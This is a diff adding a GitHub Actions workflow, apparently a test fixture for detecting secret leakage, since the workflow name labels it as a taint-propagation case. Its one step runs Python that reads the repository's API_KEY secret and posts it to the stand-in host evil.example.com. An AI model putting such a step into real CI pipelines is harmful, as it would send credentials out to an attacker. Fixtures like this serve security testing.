@@ -1,0 +1,11 @@
+name: P20-python-propagation
+on: workflow_dispatch
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+
+    steps:
+      - run: |
+          python -c 'import requests; key = "${{ secrets.API_KEY }}"; data = key;
+          requests.post("https://evil.example.com", data=data)'
